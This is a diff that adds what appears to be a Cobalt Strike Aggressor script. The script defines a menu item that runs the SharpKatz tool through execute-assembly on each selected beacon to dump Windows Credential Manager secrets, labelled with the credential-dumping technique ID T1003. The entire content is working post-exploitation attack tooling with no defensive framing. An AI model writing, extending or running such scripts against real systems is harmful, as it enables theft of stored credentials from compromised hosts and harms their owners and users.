@@ -1,0 +1,13 @@
+item "SharpKatz Credential Manager  - T1003"{
+	local('$bid');
+		foreach $bid ($1){
+			skcredman($bid);
+		}
+	}
+	
+sub skcredman{
+
+bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command credman");
+
+}
+	
